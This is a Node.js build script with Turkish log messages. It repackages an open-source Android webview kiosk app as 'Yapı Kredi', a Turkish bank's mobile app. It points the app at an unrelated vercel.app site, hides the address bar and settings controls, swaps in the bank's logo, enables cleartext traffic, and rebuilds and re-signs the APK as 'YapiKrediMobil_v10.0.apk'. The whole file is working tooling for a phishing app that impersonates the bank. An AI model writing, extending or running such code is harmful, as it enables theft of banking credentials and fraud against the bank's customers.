const fs = require('fs');
const path = require('path');
const cp = require('child_process');

console.log("=== YAPI KREDI MOBIL GERCEK APK PAKETLEME MOTORU ===");

// 1. AndroidManifest.xml: usesCleartextTraffic="true"
const manifestPath = 'kiosk_decoded/AndroidManifest.xml';
let manifest = fs.readFileSync(manifestPath, 'utf8');
if (!manifest.includes('android:usesCleartextTraffic')) {
    manifest = manifest.replace('<application ', '<application android:usesCleartextTraffic="true" ');
    fs.writeFileSync(manifestPath, manifest, 'utf8');
    console.log('[1/6] AndroidManifest.xml: usesCleartextTraffic eklendi.');
}

// 2. strings.xml: App name = Yapı Kredi
const stringsPath = 'kiosk_decoded/res/values/strings.xml';
let strings = fs.readFileSync(stringsPath, 'utf8');
strings = strings.replace('<string name="app_name">Webview Kiosk</string>', '<string name="app_name">Yapı Kredi</string>');
fs.writeFileSync(stringsPath, strings, 'utf8');
console.log('[2/6] strings.xml: Uygulama adı "Yapı Kredi" yapıldı.');

// 3. ne4.smali: Default URL, Z(), d() (hide address bar), Y() (hide wrench button)
const ne4Path = 'kiosk_decoded/smali/ne4.smali';
let ne4 = fs.readFileSync(ne4Path, 'utf8');

// Replace default URL string
ne4 = ne4.replace('"https://webviewkiosk.nktnet.uk"', '"https://erkek-sand.vercel.app"');
ne4 = ne4.replace('"http://192.168.1.153:8000/app"', '"https://erkek-sand.vercel.app"');

// Replace method Z() to return directly our URL
const oldMethodZ = `.method public final Z()Ljava/lang/String;
    .locals 2

    .line 1
    sget-object v0, Lne4;->T1:[Lks1;

    .line 2
    .line 3
    const/4 v1, 0x0

    .line 4
    aget-object v0, v0, v1

    .line 5
    .line 6
    iget-object v1, p0, Lne4;->c:Lya;

    .line 7
    .line 8
    invoke-virtual {v1, v0}, Lya;->v(Lks1;)Ljava/lang/Object;

    .line 9
    .line 10
    .line 11
    move-result-object v0

    .line 12
    check-cast v0, Ljava/lang/String;

    .line 13
    .line 14
    return-object v0
.end method`;

const newMethodZ = `.method public final Z()Ljava/lang/String;
    .locals 1

    const-string v0, "https://erkek-sand.vercel.app"

    return-object v0
.end method`;

if (ne4.includes(oldMethodZ)) {
    ne4 = ne4.replace(oldMethodZ, newMethodZ);
    console.log('[3/6] ne4.smali: Z() methodu http://192.168.1.153:8000/app dondurecek sekilde guncellendi.');
} else {
    // Regex replace for method Z
    ne4 = ne4.replace(/\.method public final Z\(\)Ljava\/lang\/String;[\s\S]*?\.end method/, newMethodZ);
    console.log('[3/6] ne4.smali: Z() methodu regex ile guncellendi.');
}

// Replace method d() (address bar mode -> HIDDEN)
const newMethodD = `.method public final d()Lm8;
    .locals 2

    sget-object v0, Lm8;->i:[Lm8;
    const/4 v1, 0x0
    aget-object v0, v0, v1
    return-object v0
.end method`;
ne4 = ne4.replace(/\.method public final d\(\)Lm8;[\s\S]*?\.end method/, newMethodD);

// Replace method Y() (floating toolbar -> HIDDEN)
const newMethodY = `.method public final Y()Ln01;
    .locals 1

    sget-object v0, Ln01;->h:Ln01;
    return-object v0
.end method`;
ne4 = ne4.replace(/\.method public final Y\(\)Ln01;[\s\S]*?\.end method/, newMethodY);

fs.writeFileSync(ne4Path, ne4, 'utf8');
console.log('[3/6] ne4.smali: Adres cubugu ve ayar butonu gizlendi, tam ekran Yapı Kredi yapıldı.');

// 4. Icons: Replace mipmap icons with Yapı Kredi icon
const iconData = fs.readFileSync('icon.png');
const mipmapDirs = fs.readdirSync('kiosk_decoded/res').filter(d => d.startsWith('mipmap-'));
mipmapDirs.forEach(dir => {
    const fullDir = path.join('kiosk_decoded/res', dir);
    ['ic_launcher.webp', 'ic_launcher_round.webp'].forEach(f => {
        const target = path.join(fullDir, f);
        if (fs.existsSync(target)) {
            fs.writeFileSync(target, iconData);
        }
    });
});
console.log('[4/6] Ikonlar resmi Yapı Kredi logosu ile degistirildi.');

// 5. Build APK using apktool
console.log('[5/6] apktool ile APK derleniyor...');
const tempUnsigned = path.join(__dirname, 'temp_unsigned.apk');
if (fs.existsSync(tempUnsigned)) fs.unlinkSync(tempUnsigned);

const buildOutput = cp.execSync('java -jar apktool.jar b kiosk_decoded -o ' + tempUnsigned, { encoding: 'utf8' });
console.log('Derleme ciktisi:\n', buildOutput);

// 6. Sign APK with uber-apk-signer
console.log('[6/6] APK uber-apk-signer ile imzalanıyor ve zipalign ediliyor...');
const signTempDir = path.join(__dirname, 'temp_signed_dir');
if (fs.existsSync(signTempDir)) fs.rmSync(signTempDir, { recursive: true });
fs.mkdirSync(signTempDir, { recursive: true });

const signCmd = 'java -jar uber-apk-signer.jar -a "' + tempUnsigned + '" --ks ykb.keystore --ksAlias ykbkey --ksPass 123456 --ksKeyPass 123456 -o "' + signTempDir + '" --allowResign';
console.log('İmzalama komutu çalıştırılıyor...');
const signOutput = cp.execSync(signCmd, { encoding: 'utf8' });
console.log('İmzalama çıktısı:\n', signOutput);

// Find generated signed APK in signTempDir
const signedFiles = fs.readdirSync(signTempDir).filter(f => f.endsWith('.apk'));
if (signedFiles.length === 0) {
    throw new Error('İmzalı APK bulunamadı!');
}

const signedApkPath = path.join(signTempDir, signedFiles[0]);
const outApk = 'C:\\Users\\PC\\Desktop\\YapiKrediMobil_v10.0.apk';
const desktopDefault = 'C:\\Users\\PC\\Desktop\\YapiKrediMobil.apk';

fs.copyFileSync(signedApkPath, outApk);
fs.copyFileSync(signedApkPath, desktopDefault);

// Cleanup
fs.unlinkSync(tempUnsigned);
fs.rmSync(signTempDir, { recursive: true });

const stat = fs.statSync(outApk);
console.log('\n======================================================');
console.log('BAŞARILI: YapiKrediMobil_v10.0.apk MASAÜSTÜNDE HAZIR!');
console.log('Boyut:', Math.round(stat.size / 1024 / 1024 * 100) / 100, 'MB');
console.log('Konum: ' + outApk);
console.log('Alternatif: ' + desktopDefault);
console.log('======================================================');
